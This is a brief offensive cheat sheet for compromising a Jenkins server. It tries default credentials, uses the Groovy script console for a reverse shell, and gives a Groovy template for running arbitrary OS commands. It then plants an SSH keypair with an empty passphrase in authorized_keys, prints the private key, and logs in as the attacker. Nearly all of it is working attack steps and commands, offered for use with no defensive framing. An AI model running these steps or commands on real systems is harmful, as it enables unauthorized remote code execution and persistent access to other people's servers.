## Requirements: Access to a jenkins dashboard and script console

## Steps:

#### 1) Authenticate to the Jenkins instance. Try common credentials like: (jenkins:jenkins)

#### 2) Dashboard

#### 3) Manage Jenkins

#### 4) Script Console

#### 5) Setup listener

#### 6) Run a groovy reverse shell script

# Alternate Method: Create SSH Key-pair for SSH Access (Requires SSH port being open, and use this in case the reverse shell doesn't work)

## Command running template:

### def proc = "id".execute() (Replace the "id" value with any OS Command)

### def b = new StringBuffer()

### proc.consumeProcessErrorStream(b)

### println proc.text

### println b.toString()

## Command Steps:

#### 1) pwd (Show working directory)

#### 2) env (Verify the home location of our user)

#### 3) mkdir .ssh (Build an .ssh directory)

#### 4) ssh-keygen -t rsa -b 4096 -N \"\" -f .ssh/id_rsa (Create SSH keypair for our user. THE PASSPHRASE IS: "")

#### 5) cp .ssh/id_rsa.pub .ssh/authorized_keys (Copy the public SSH key to create the "authorized_keys" file)

#### 6) cat .ssh/id_rsa (Print the private key to copy locally)

#### 7) Attacker: chmod 600 id_rsa (Give the correct permissions to use the key)

#### 8) Attacker: ssh -i id_rsa USER@IP (SSH into the target user using the key)
